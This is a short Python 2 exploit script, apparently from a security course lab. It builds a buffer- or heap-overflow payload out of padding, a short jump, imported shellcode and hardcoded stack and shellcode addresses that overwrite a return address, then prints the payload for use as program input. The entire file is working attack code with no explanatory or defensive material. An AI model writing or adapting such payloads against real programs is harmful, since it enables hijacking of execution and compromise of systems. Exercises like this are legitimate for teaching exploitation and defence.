from shellcode import shellcode
from struct import pack
ret_addr = pack("<I", 0xbffeeb2c)	# address of return addr.
exp_addr = pack("<I", 0x080f3724)	# address of shellcode
# shellcode = "\xeb\x080f372c" + "A" * 4 + shellcode
shellcode = '\xeb\x06' + 'a' * 6 + shellcode
print "A" * 4 + shellcode + " " + "A" * 40 + exp_addr  + ret_addr + " " + "B" * 32
